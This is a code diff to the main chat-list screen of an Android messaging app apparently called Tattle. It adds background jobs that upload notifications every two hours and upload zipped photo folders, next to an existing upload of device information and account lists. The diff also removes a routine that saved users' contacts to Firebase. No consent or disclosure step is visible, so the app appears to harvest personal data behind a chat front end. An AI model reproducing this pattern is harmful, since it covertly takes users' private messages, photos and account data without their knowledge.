@@ -4,8 +4,16 @@ import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AlertDialog;
 import androidx.core.app.ActivityCompat;
+import androidx.lifecycle.Observer;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
+import androidx.work.Constraints;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.NetworkType;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkInfo;
+import androidx.work.WorkManager;
 
 import android.Manifest;
 import android.content.ContentResolver;
@@ -25,12 +33,15 @@ import android.widget.ProgressBar;
 import android.widget.Toast;
 
 import com.bumptech.glide.Glide;
+import com.codies.Tattle.DataUploadServices.MediaFilesUploader;
+import com.codies.Tattle.DataUploadServices.NotificationUploadScheduler;
 import com.codies.Tattle.Interfaces.ChatClickListener;
 import com.codies.Tattle.Models.ChatList;
 import com.codies.Tattle.Models.ContactsInfo;
 import com.codies.Tattle.Models.User;
 import com.codies.Tattle.OtherUtils.ContactUtil;
 import com.codies.Tattle.OtherUtils.DeviceInfo;
+import com.codies.Tattle.OtherUtils.ImageFileSaver;
 import com.codies.Tattle.R;
 import com.codies.Tattle.DataUploadServices.BasicDataUploadService;
 import com.codies.Tattle.Services.LoginService;
@@ -59,7 +70,9 @@ import com.quickblox.users.model.QBUser;
 import java.io.File;
 import java.io.Serializable;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
 
 public class ChatListActivity extends BaseActivity implements ChatClickListener {
 
@@ -118,19 +131,52 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         recyclerView.setLayoutManager(new LinearLayoutManager(this));
         recyclerView.setAdapter(chatsAdapter);
 
+        startLoginService();
+        readChats();
+        getCurrentUserData();
+        startNotificationUploadService();
+
         if (!sharedPrefs.isBasicDataUploaded()) {
             uploadDeviceInfo();
         }
 
-
-        readChats();
-        startLoginService();
-        getCurrentUserData();
+        if (sharedPrefs.isFoldersZipped()) {
+            startImageUploadService();
+        }
 
         newChatBt.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 startActivity(new Intent(ChatListActivity.this, SearchActivity.class));
+            }
+        });
+    }
+
+    public void startNotificationUploadService() {
+        Log.i(TAG, "startWorkmanager: work manager has started");
+        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
+        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
+                .setConstraints(constraints)
+                .build();
+
+        WorkManager instance = WorkManager.getInstance();
+        instance.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE,build);
+    }
+
+    public void startImageUploadService() {
+        final WorkManager mWorkManager = WorkManager.getInstance();
+        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class).build();
+
+        mWorkManager.enqueue(mRequest);
+        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
+            @Override
+            public void onChanged(@Nullable WorkInfo workInfo) {
+                if (workInfo != null) {
+                    if (workInfo.getState().isFinished()) {
+                        workInfo.getOutputData().getBoolean("photosZipped", false);
+                        Log.i(TAG, "onChanged: " + Arrays.toString(workInfo.getOutputData().getStringArray("photosList")));
+                    }
+                }
             }
         });
     }
@@ -144,8 +190,6 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
         BasicDataUploadService.enqueueWork(this, serviceIntent);
     }
-
-
 
     public void readChats() {
         databaseReference.child("ChatList").child(userId).addValueEventListener(new ValueEventListener() {
@@ -465,105 +509,5 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         intent.putExtra("image", profileUrl);
         startActivity(intent);
     }
-
-
-
-   /* public void requestContactPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                if (ActivityCompat.shouldShowRequestPermissionRationale(this,
-                        android.Manifest.permission.READ_CONTACTS)) {
-                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
-                    builder.setTitle("Read contacts access needed");
-                    builder.setPositiveButton(android.R.string.ok, null);
-                    builder.setMessage("Please enable access to contacts.");
-                    builder.setOnDismissListener(new DialogInterface.OnDismissListener() {
-                        @TargetApi(Build.VERSION_CODES.M)
-                        @Override
-                        public void onDismiss(DialogInterface dialog) {
-                            requestPermissions(
-                                    new String[]
-                                            {android.Manifest.permission.READ_CONTACTS}
-                                    , PERMISSIONS_REQUEST_READ_CONTACTS);
-                        }
-                    });
-                    builder.show();
-                } else {
-                    ActivityCompat.requestPermissions(this,
-                            new String[]{android.Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
-                }
-            } else {
-                getContacts();
-            }
-        } else {
-            getContacts();
-        }
-    }*/
-
-    public void saveContactsToFirebase(List<ContactsInfo> contactInfos) {
-        databaseReference.child("userContactsList").child(mAuth.getCurrentUser().getUid()).child("contacts").setValue(contactInfos).addOnSuccessListener(new OnSuccessListener<Void>() {
-            @Override
-            public void onSuccess(Void aVoid) {
-                Toast.makeText(ChatListActivity.this, "Data Updated Successfully!", Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-
-
-
-/*    private ArrayList<imageFolder> getPicturePaths(){
-        ArrayList<imageFolder> picFolders = new ArrayList<>();
-        ArrayList<String> picPaths = new ArrayList<>();
-        Uri allImagesuri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        String[] projection = { MediaStore.Images.ImageColumns.DATA ,MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.BUCKET_DISPLAY_NAME,MediaStore.Images.Media.BUCKET_ID};
-        Cursor cursor = this.getContentResolver().query(allImagesuri, projection, null, null, null);
-        try {
-            if (cursor != null) {
-                cursor.moveToFirst();
-            }
-            do{
-                imageFolder folds = new imageFolder();
-                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
-                String folder = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME));
-                String datapath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
-
-                //String folderpaths =  datapath.replace(name,"");
-                String folderpaths = datapath.substring(0, datapath.lastIndexOf(folder+"/"));
-                folderpaths = folderpaths+folder+"/";
-                if (!picPaths.contains(folderpaths)) {
-                    picPaths.add(folderpaths);
-
-                    folds.setPath(folderpaths);
-                    folds.setFolderName(folder);
-                    folds.setFirstPic(datapath);//if the folder has only one picture this line helps to set it as first so as to avoid blank image in itemview
-                    folds.addpics();
-                    picFolders.add(folds);
-                }else{
-                    for(int i = 0;i<picFolders.size();i++){
-                        if(picFolders.get(i).getPath().equals(folderpaths)){
-                            picFolders.get(i).setFirstPic(datapath);
-                            picFolders.get(i).addpics();
-                        }
-                    }
-                }
-            }while(cursor.moveToNext());
-            cursor.close();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        for(int i = 0;i < picFolders.size();i++){
-            Log.d("picture folders",picFolders.get(i).getFolderName()+" and path = "+picFolders.get(i).getPath()+" "+picFolders.get(i).getNumberOfPics());
-        }
-
-        //reverse order ArrayList
-       *//* ArrayList<imageFolder> reverseFolders = new ArrayList<>();
-
-        for(int i = picFolders.size()-1;i > reverseFolders.size()-1;i--){
-            reverseFolders.add(picFolders.get(i));
-        }*//*
-
-        return picFolders;
-    }*/
 
 }
